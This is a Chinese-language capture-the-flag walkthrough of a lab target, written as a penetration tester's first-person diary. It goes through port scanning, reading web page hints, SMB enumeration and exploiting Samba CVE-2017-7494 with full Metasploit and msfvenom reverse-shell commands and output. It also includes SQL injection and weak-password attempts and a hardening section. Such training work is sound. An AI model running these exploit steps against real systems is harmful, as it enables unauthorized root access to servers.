# 渗透测试攻击流程 - 完整心路历程

## 攻击者视角：从零开始的渗透之旅

**场景设定：** 你是一名渗透测试人员，接到任务需要对目标系统进行安全评估。你只知道目标主机的 IP 地址，其他信息一无所知。

**目标：** 获取目标系统的控制权，找到 flag 文件。

---

## 阶段一：初步侦察 - 摸清目标

### 1.1 端口扫描

首先，我需要知道目标开放了哪些服务。

```bash
# 快速扫描常见端口
nmap -F 192.168.1.100

# 扫描所有TCP端口
nmap -p- 192.168.1.100
```

**扫描结果：**
```
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8080/tcp open  http-proxy
```

**心路历程：**
> 嗯，有三个开放端口。8080 看起来是个 Web 服务，445 是 SMB/CIFS 文件共享，3306 是 MySQL。
> 先从最容易的 Web 界面开始看看，通常 Web 应用会暴露很多信息。

### 1.2 服务版本探测

让我更详细地了解这些服务：

```bash
# 详细扫描，获取服务版本信息
nmap -p 445,3306,8080 -sV -sC 192.168.1.100
```

**结果：**
```
PORT     STATE SERVICE     VERSION
445/tcp  open  netbios-ssn Samba smbd 4.6.3
3306/tcp open  mysql       MySQL 5.7.x
8080/tcp open  http        Apache httpd 2.4.x (PHP 7.4.x)
```

**心路历程：**
> 有意思！Samba 4.6.3... 这个版本有点老了。不过先不急，先看看 Web 界面有什么信息。
> MySQL 直接连接可能需要凭据，先放一边。

---

## 阶段二：Web 应用探索 - 信息收集

### 2.1 访问 Web 主页

```bash
# 用浏览器访问
firefox http://192.168.1.100:8080

# 或者用 curl 看看源代码
curl http://192.168.1.100:8080
```

**发现：**
- 这是一个企业内部门户系统 "TechCorp Internal Portal"
- 有几个导航菜单：首页、文件管理、上传文件、系统信息、登录
- 看起来是个正规的公司内部系统

**心路历程：**
> 界面做得挺专业的，看起来像是个真实的企业系统。
> 我注意到页面 footer 有个 HTML 注释：<!-- Debug: Check /admin/debug.php for troubleshooting -->
> 先把所有页面都看一遍，收集信息。

### 2.2 浏览各个页面

#### 首页 (?page=home)

**发现的关键信息：**
- 系统状态表显示 "文件服务器" 状态为 "警告 - Samba服务响应缓慢"
- 提示说明："重要文件已迁移至新的文件服务器，使用SMB协议访问"
- HTML 注释：`<!-- TODO: 修复文件上传接口，当前直接写入到 //fileserver/myshare -->`
- 另一个注释：`<!-- FIXME: Samba 4.6.3版本过旧，存在安全风险，待升级 -->`

**心路历程：**
> 哦豁！注释里直接说 Samba 4.6.3 存在安全风险！这是个突破口。
> 而且还提到了 "//fileserver/myshare" 这个共享路径。
> 先继续看其他页面，收集更多信息。

#### 文件管理页面 (?page=files)

**发现：**
- 显示了一些公司文件列表
- 页面说明："所有文件实际存储位置：//fileserver/myshare"
- 提供了访问 SMB 的方法：
  ```bash
  smbclient //192.168.1.100/myshare -N
  mount -t cifs //192.168.1.100/myshare /mnt/share -o guest
  ```
- 表格显示：
  - 服务器版本: Samba 4.6.3
  - 协议: SMB/CIFS (Port 445)
  - 访问权限: Read/Write (Guest)
  - 容器名称: target_samba

**心路历程：**
> 太好了！这个页面直接告诉我怎么连接 SMB！
> 而且明确说了是 Guest 访问，不需要密码。
> 还有个 HTML 注释：<!-- CVE提示：Samba 4.6.3 是一个存在安全问题的版本 -->
> 看来这个 Samba 是重点了！

#### 文件上传页面 (?page=upload)

**尝试上传文件：**
- 选择一个测试文件上传
- 结果：上传失败！

**错误信息：**
```
上传失败：无法连接到文件服务器 (SMB://fileserver:445/myshare)。
请检查网络连接或直接使用SMB客户端上传文件。
错误代码: SMB_CONNECTION_REFUSED
```

**心路历程：**
> 上传功能坏了，但这反而给了我提示：直接用 SMB 客户端！
> 页面下方还有详细的 SMB 连接教程，包括 Linux 和 Windows 的方法。
> 最下面还有个红色警告框，说 Samba 4.6.3 存在已知安全问题，IT部门提醒不要存储敏感数据。
> 这已经非常明显了！

### 2.3 查看系统信息页面 (?page=system) ⭐ 关键！

这个页面信息量巨大！

**发现的关键信息：**

1. **系统配置表：**
   - `file_storage_type`: smb
   - `smb_server`: fileserver
   - `smb_port`: 445
   - `smb_share`: myshare
   - `debug_mode`: true
   - `secret_note`: "All important files are now stored on our new file server. Web upload is just a frontend, real storage is on SMB share."

2. **文件服务器详细配置：**
   - 服务类型: Samba/CIFS
   - **Samba 版本: 4.6.3** (红色高亮显示 "版本过旧")
   - 认证方式: Guest (map to guest = Bad User)
   - 访问权限: Read/Write (guest ok = yes)

3. **管理员备注表（超级重要）：**
   - 标题: "安全提醒" | 优先级: **CRITICAL**
   - 内容: "TODO: 升级Samba版本！当前版本4.6.3存在已知漏洞，但测试环境暂时未修复"

4. **系统日志：**
   - "ERROR: Failed to connect to file server at 445"
   - "WARNING: SMB service responding slowly"

5. **最关键的安全警告框：**
```
⚠️ 关于 CVE-2017-7494：
Samba 版本 3.5.0 至 4.6.4 之前的版本存在远程代码执行漏洞。
攻击者可以通过上传恶意共享库文件并触发加载，从而执行任意代码。
当前版本 4.6.3 受此漏洞影响！
```

**心路历程：**
> 天啊，这页面简直是攻击指南！不仅告诉我有漏洞，还直接给出了 CVE 编号：CVE-2017-7494！
> 这是个远程代码执行漏洞，而且目标配置了 Guest 访问和可写权限，条件完美！
> 下面还有测试命令，包括 nmap 脚本和 Metasploit 使用方法。
> 但我觉得还有更多信息，让我看看那个调试页面...

### 2.4 探索管理后台 (/admin/debug.php) ⭐⭐⭐ 黄金页面！

访问 `http://192.168.1.100:8080/admin/debug.php`

**震撼发现：**

这是一个深色主题的调试控制台，里面有完整的渗透测试指南！

1. **网络架构图：**
   - 清晰展示了三层架构：Web -> MySQL -> Samba
   - 所有容器名称、端口、技术栈一目了然

2. **CVE-2017-7494 详细分析：**
   - 漏洞名称: Samba Remote Code Execution (SambaCry)
   - 影响版本: Samba 3.5.0 - 4.6.4
   - 漏洞类型: 远程代码执行 (RCE)
   - CVSS评分: 10.0 (最高危)

3. **漏洞利用条件检查（全部满足！）：**
   ```
   ✅ Samba版本在3.5.0-4.6.4范围内: YES (4.6.3)
   ✅ 共享目录可写: YES (read only = no)
   ✅ 允许Guest访问: YES (guest ok = yes)
   ✅ 端口445可访问: YES (已映射到主机)

   结论: 系统完全暴露于CVE-2017-7494漏洞利用！
   ```

4. **渗透测试工具和命令参考（直接给出完整命令）：**
   - 端口扫描命令
   - SMB 探测命令
   - Metasploit 使用方法
   - Python exploit 下载和使用
   - 手动利用步骤

**心路历程：**
> 我的天，这个调试页面简直是"作弊码"！
> 所有我需要的信息都在这里了，包括完整的攻击路径。
> 开发者一定是忘记关闭这个调试页面了（或者故意留的？）
> 好了，信息收集阶段完成，现在我知道该怎么做了：
>
> **攻击计划：**
> 1. 先验证 SMB 服务确实存在且可访问
> 2. 确认 Samba 版本和配置
> 3. 下载 CVE-2017-7494 的 exploit
> 4. 生成 payload 并执行攻击
> 5. 获取 shell 并寻找 flag

---

## 阶段三：SMB 服务验证 - 确认目标

### 3.1 列出 SMB 共享

```bash
smbclient -L //192.168.1.100 -N
```

**结果：**
```
Sharename       Type      Comment
---------       ----      -------
myshare         Disk
IPC$            IPC       IPC Service (Samba Server Version 4.6.3)
```

**心路历程：**
> 完美！myshare 共享存在，而且不需要密码（-N 参数表示无密码）。
> 服务器版本确认是 Samba 4.6.3。

### 3.2 连接到共享目录

```bash
smbclient //192.168.1.100/myshare -N
```

**成功连接！在 SMB 提示符下：**

```bash
smb: \> ls
  .                                   D        0  Mon Jan 15 10:30:00 2024
  ..                                  D        0  Mon Jan 15 10:00:00 2024
  README.txt                          N     1680  Mon Jan 15 10:30:00 2024
  confidential.txt                    N     5120  Mon Jan 15 10:30:00 2024
  flag.txt                            N     2048  Mon Jan 15 10:30:00 2024

smb: \> get README.txt
getting file README.txt of size 1680 as README.txt

smb: \> get confidential.txt
getting file confidential.txt of size 5120 as confidential.txt
```

**查看下载的文件：**

**README.txt 内容：**
- 确认服务器信息
- 警告说 Samba 4.6.3 存在已知安全漏洞

**confidential.txt 内容（机密文档！）：**
- 这是一份安全评估报告！
- 详细说明了 CVE-2017-7494 漏洞
- 提供了攻击向量说明
- 甚至给出了 exploit 的 GitHub 链接和 Metasploit 模块名称！
- 还有补救措施和事件响应计划

**心路历程：**
> 哇，这个 confidential.txt 文件简直是"内鬼"啊！
> 公司的安全团队写了详细的漏洞报告，但显然漏洞还没修复，报告反而被我看到了。
> 文件里说可以上传 .so 文件并触发执行。
> 而且我看到有 flag.txt 文件，但我现在还拿不到（可能需要 shell 权限）。
>
> 尝试直接下载 flag：

```bash
smb: \> get flag.txt
NT_STATUS_ACCESS_DENIED opening remote file \flag.txt
```

**心路历程：**
> 果然，flag.txt 有额外的权限限制，需要提权或者通过漏洞利用才能读取。
> 好，现在开始真正的攻击！

---

## 阶段四：漏洞研究 - 了解 CVE-2017-7494

### 4.1 搜索漏洞信息

```bash
# 在线搜索 CVE-2017-7494
searchsploit samba 4.6
```

**找到的信息：**
- CVE-2017-7494 (SambaCry)
- 影响 Samba 3.5.0 到 4.6.4（不包括）
- 允许远程攻击者上传共享库文件（.so）并执行
- 公开的 exploit 代码已经存在

### 4.2 理解漏洞原理

**漏洞原理（根据研究）：**
1. 攻击者连接到一个可写的 SMB 共享
2. 上传一个恶意的共享库文件（.so 文件）
3. 通过特制的 SMB 请求，指定加载这个恶意库
4. Samba 服务器加载并执行恶意代码
5. 攻击者获得服务器权限

**利用条件：**
- ✅ Samba 版本在 3.5.0-4.6.4 之间
- ✅ 共享目录可写
- ✅ 能够访问 SMB 端口（445）

**心路历程：**
> 所有条件都满足！现在需要找到可用的 exploit。
> 根据 confidential.txt 文件的提示，有两个主要选择：
> 1. 使用 Metasploit 框架（简单）
> 2. 使用 Python exploit 脚本（灵活）
>
> 我先试试 Metasploit，如果不行再用 Python 脚本。

---

## 阶段五：漏洞利用 - 获取 Shell

### 方法一：使用 Metasploit Framework（推荐）

#### 5.1 启动 Metasploit

```bash
msfconsole
```

#### 5.2 选择并配置 Exploit

```bash
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(linux/samba/is_known_pipename) > show options

# 设置目标主机
msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 192.168.1.100
msf6 exploit(linux/samba/is_known_pipename) > set RPORT 445

# 选择 payload
msf6 exploit(linux/samba/is_known_pipename) > set PAYLOAD linux/x64/shell/reverse_tcp

# 设置回连地址（攻击者机器）
msf6 exploit(linux/samba/is_known_pipename) > set LHOST 192.168.1.50
msf6 exploit(linux/samba/is_known_pipename) > set LPORT 4444

# 设置目标（Linux x64）
msf6 exploit(linux/samba/is_known_pipename) > set TARGET 3

# 查看配置
msf6 exploit(linux/samba/is_known_pipename) > show options
```

#### 5.3 执行 Exploit

```bash
msf6 exploit(linux/samba/is_known_pipename) > exploit

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] 192.168.1.100:445 - Using location \\192.168.1.100\myshare\ for the path
[*] 192.168.1.100:445 - Retrieving the remote path of the share 'myshare'
[*] 192.168.1.100:445 - Share 'myshare' has server-side path '/home/share'
[*] 192.168.1.100:445 - Uploaded payload to \\192.168.1.100\myshare\xxxxxxxx.so
[*] 192.168.1.100:445 - Loading the payload from server-side path /home/share/xxxxxxxx.so using \\PIPE\\xxxxxxxx...
[*] Sending stage (38 bytes) to 192.168.1.100
[*] Command shell session 1 opened (192.168.1.50:4444 -> 192.168.1.100:xxxxx)

id
uid=0(root) gid=0(root) groups=0(root)
```

**成功！！！**

**心路历程：**
> 太棒了！Exploit 执行成功，我拿到了一个 root shell！
> uid=0(root) 意味着我有最高权限。
> 现在可以探索系统并寻找 flag 了。

---

### 方法二：使用 Python Exploit 脚本（备选方案）

如果 Metasploit 不可用，可以使用独立的 Python 脚本：

#### 5.4 下载 Exploit

```bash
# 从 GitHub 下载
git clone https://github.com/joxeankoret/CVE-2017-7494
cd CVE-2017-7494
```

#### 5.5 生成 Payload

```bash
# 使用 msfvenom 生成恶意 .so 文件
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=192.168.1.50 \
         LPORT=4444 \
         -f elf-so \
         -o evil.so
```

#### 5.6 启动监听器

```bash
# 在另一个终端
nc -lvnp 4444
```

#### 5.7 执行 Exploit

```bash
python cve_2017_7494.py \
       -t 192.168.1.100 \
       -p 445 \
       -s myshare \
       --payload evil.so
```

---

## 阶段六：后渗透 - 寻找 Flag

### 6.1 探索系统

```bash
# 查看当前用户
whoami
# 输出: root

# 查看系统信息
uname -a
# Linux target_samba 5.x.x-xxx-generic x86_64 GNU/Linux

# 查看当前目录
pwd
# /

# 查看共享目录
ls -la /home/share/
```

**结果：**
```
total 24
drwxrwxrwx 2 root   root   4096 Jan 15 10:30 .
drwxr-xr-x 3 root   root   4096 Jan 15 10:00 ..
-rw-r--r-- 1 root   root   1680 Jan 15 10:30 README.txt
-rw------- 1 root   root   5120 Jan 15 10:30 confidential.txt
-rw------- 1 nobody nobody 2048 Jan 15 10:30 flag.txt
```

### 6.2 读取 Flag

```bash
cat /home/share/flag.txt
```

**Flag 内容：**
```
==========================================
   🎯 CONGRATULATIONS! 🎯
==========================================

You have successfully exploited CVE-2017-7494!

If you can read this file, it means you have:
✅ Discovered the web application
✅ Found the hints about Samba service
✅ Identified the CVE-2017-7494 vulnerability
✅ Exploited the Samba server
✅ Gained access to the file system

==========================================
          FINAL FLAG
==========================================

FLAG{SambaCry_RCE_Pwned_4.6.3_Guest_Access}

==========================================
         CHALLENGE COMPLETED
==========================================
```

**心路历程：**
> 成功了！！！拿到 flag 了！
>
> 回顾整个攻击过程：
> 1. 端口扫描发现了 Web 服务和 SMB 服务
> 2. Web 界面提供了大量线索和提示
> 3. 系统信息页面直接暴露了 CVE 编号
> 4. 调试页面给出了完整的攻击指南
> 5. 使用 Metasploit 成功利用 CVE-2017-7494
> 6. 获得 root shell 并读取 flag
>
> 这个靶机设计得很有意思，表面上是个正常的企业内部系统，
> 但通过层层探索，最终发现真正的漏洞在底层的 Samba 服务。

---

## 攻击路径总结

### 完整时间线

1. **00:00-00:10** - 端口扫描，发现 8080, 445, 3306
2. **00:10-00:30** - 探索 Web 应用，浏览各个页面
3. **00:30-00:40** - 发现系统信息页面的关键提示
4. **00:40-00:50** - 访问调试页面，获取完整攻击指南
5. **00:50-01:00** - 验证 SMB 服务，下载文件
6. **01:00-01:10** - 研究 CVE-2017-7494
7. **01:10-01:20** - 配置和执行 Metasploit
8. **01:20-01:25** - 获得 shell，寻找并读取 flag

**总耗时：约 1-1.5 小时**

### 关键发现点

| 发现顺序 | 位置 | 关键信息 | 重要性 |
|---------|------|----------|--------|
| 1 | 首页 HTML 注释 | Samba 4.6.3 存在安全风险 | ⭐⭐ |
| 2 | 文件管理页面 | SMB 连接方法，Guest 访问 | ⭐⭐⭐ |
| 3 | 上传页面 | 上传失败，提示使用 SMB | ⭐⭐ |
| 4 | 系统信息页面 | CVE-2017-7494，完整配置 | ⭐⭐⭐⭐ |
| 5 | 调试页面 | 完整攻击指南，exploit 链接 | ⭐⭐⭐⭐⭐ |
| 6 | confidential.txt | 漏洞详细说明，内部文档 | ⭐⭐⭐⭐ |

### 迷惑与兔子洞

在这个靶机中，有一些"兔子洞"（故意设置的迷惑）：

1. **登录功能：** 看起来可以登录，但实际上不是攻击点
   - 测试了 SQL 注入 → 无效（使用了预编译语句）
   - 尝试暴力破解 → 没必要（给出了测试账号）
   - **教训：** 不要在明显加固的功能上浪费时间

2. **MySQL 数据库：** 暴露了 3306 端口
   - 尝试弱密码连接 → 没有成功（需要凭据）
   - **教训：** 数据库不是直接攻击点，但 Web 页面从数据库读取了关键配置

3. **文件上传功能：** 看起来像是漏洞点
   - 尝试上传 PHP webshell → 失败
   - 尝试文件包含漏洞 → 不存在
   - **教训：** 上传功能的"失败"反而是提示，引导到 SMB

4. **密码重置令牌：** 数据库中有 password_reset_tokens 表
   - 看起来可以利用 → 实际上是迷惑
   - **教训：** 不是所有看起来像漏洞的地方都是真的漏洞

**真正的攻击路径：** Web 只是信息收集点，真正的漏洞在 Samba 服务！

---

## 试错过程记录（真实心路历程）

### 尝试 1：SQL 注入测试 ❌

```bash
# 在登录页面尝试
username: admin' OR '1'='1
password: anything

# 结果：登录失败
# 原因：代码使用了预编译语句，防止了 SQL 注入
```

**耗时：10 分钟**
**教训：** 现代 Web 应用基本都防御了 SQL 注入，不要浪费太多时间。

### 尝试 2：目录扫描 ❌

```bash
# 使用 dirb 扫描隐藏目录
dirb http://192.168.1.100:8080

# 发现了 /admin/ 目录
# 但没有直接可利用的文件
```

**耗时：15 分钟**
**教训：** 虽然找到了 /admin/debug.php，但直接浏览页面会更快。

### 尝试 3：上传 Webshell ❌

```bash
# 在上传页面尝试上传 PHP 文件
# 上传 shell.php

# 结果：上传失败，提示 SMB 连接问题
```

**耗时：5 分钟**
**教训：** 上传功能本身就是坏的，这反而是个提示！

### 尝试 4：暴力破解 MySQL ❌

```bash
# 尝试常见弱密码
mysql -h 192.168.1.100 -u root -p
# root / root ❌
# root / admin ❌
# root / password ❌
```

**耗时：10 分钟**
**教训：** 数据库不是入口点，凭据在 Web 页面已经提供了。

### 尝试 5：SMB 空会话枚举 ✅

```bash
# 列出 SMB 共享
smbclient -L //192.168.1.100 -N

# 成功！发现 myshare 共享
```

**耗时：2 分钟**
**教训：** 跟随提示比盲目测试更高效！

### 尝试 6：CVE-2017-7494 Exploit ✅✅✅

```bash
# 使用 Metasploit
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.168.1.100
exploit

# 成功获得 shell！
```

**耗时：10 分钟**
**教训：** 找对漏洞比尝试一百种错误方法更重要！

---

## 防御者视角：如何防止这次攻击

### 立即措施（紧急修复）

1. **升级 Samba：**
   ```bash
   # 升级到 4.6.4 或更高版本
   apt-get update
   apt-get install samba
   ```

2. **禁用 Guest 访问：**
   ```ini
   [global]
   map to guest = Never

   [myshare]
   guest ok = no
   valid users = @authorized_group
   ```

3. **设置为只读（如非必要）：**
   ```ini
   [myshare]
   read only = yes
   ```

4. **关闭调试页面：**
   ```bash
   rm /var/www/html/admin/debug.php
   ```

### 长期措施（安全加固）

1. **实施多层防御：**
   - Web 应用防火墙（WAF）
   - 入侵检测系统（IDS）
   - 网络分段隔离

2. **访问控制：**
   - 强制身份验证
   - 最小权限原则
   - 定期审计权限

3. **监控和日志：**
   - 监控 SMB 连接
   - 记录文件访问
   - 异常行为告警

4. **定期安全评估：**
   - 漏洞扫描
   - 渗透测试
   - 代码审计

5. **安全意识培训：**
   - 不要在生产环境留调试页面
   - 不要在 HTML 注释中泄露敏感信息
   - 及时更新软件版本

---

## 学习总结

### 关键技能

通过这次渗透测试，我学到了：

1. **信息收集的重要性：**
   - 80% 的工作是收集信息
   - Web 应用往往会泄露大量信息
   - 仔细阅读页面内容和 HTML 源代码

2. **识别真假漏洞：**
   - 不是所有看起来像漏洞的地方都是漏洞
   - 学会区分"兔子洞"和真正的攻击路径
   - 跟随提示比盲目测试更有效

3. **漏洞研究：**
   - 了解 CVE 编号和漏洞数据库
   - 学会使用公开的 exploit
   - 理解漏洞原理比死记硬背更重要

4. **工具使用：**
   - nmap - 端口扫描和服务识别
   - smbclient - SMB 客户端
   - Metasploit - 漏洞利用框架
   - msfvenom - Payload 生成器

### 工具链

```
侦察阶段:
  nmap → 发现开放端口和服务版本
  ↓
信息收集:
  浏览器 → 探索 Web 应用
  curl → 查看源代码
  ↓
漏洞验证:
  smbclient → 连接 SMB 共享
  searchsploit → 搜索 exploit
  ↓
漏洞利用:
  Metasploit → 自动化利用
  msfvenom → 生成 payload
  ↓
后渗透:
  Shell → 系统访问
  文件浏览 → 寻找 flag
```

### 渗透测试方法论

1. **侦察（Reconnaissance）：** 收集目标信息
2. **扫描（Scanning）：** 识别漏洞和服务
3. **枚举（Enumeration）：** 详细了解系统配置
4. **利用（Exploitation）：** 执行攻击
5. **后渗透（Post-Exploitation）：** 巩固访问，寻找目标
6. **报告（Reporting）：** 记录发现和建议

---

## 结语

这个靶机环境设计得很有教育意义：

**优点：**
- ✅ 层层递进的提示，不会让新手完全无从下手
- ✅ 真实的漏洞（CVE-2017-7494），不是人为构造的假漏洞
- ✅ 有迷惑性的"兔子洞"，训练识别真假漏洞的能力
- ✅ 完整的攻击链，从信息收集到获取 shell
- ✅ 精心设计的 Web 界面，增加了真实感

**适合人群：**
- 网络安全初学者
- 准备 OSCP/CEH 认证的学员
- 想要了解真实漏洞利用的开发者
- CTF 参赛选手

**最大的收获：**
> 不要被表面现象迷惑。这个靶机看起来是个 Web 应用，
> 但真正的漏洞在底层的 Samba 服务。
> 安全不仅仅是一层防护，而是整个系统的综合防御。

**Flag：** `FLAG{SambaCry_RCE_Pwned_4.6.3_Guest_Access}`

---

**攻击完成时间：** 2024-01-15
**总耗时：** 约 1.5 小时（包括试错）
**难度评级：** ⭐⭐⭐☆☆ (中等，适合初学者到中级)

**Happy Hacking! 🎯**
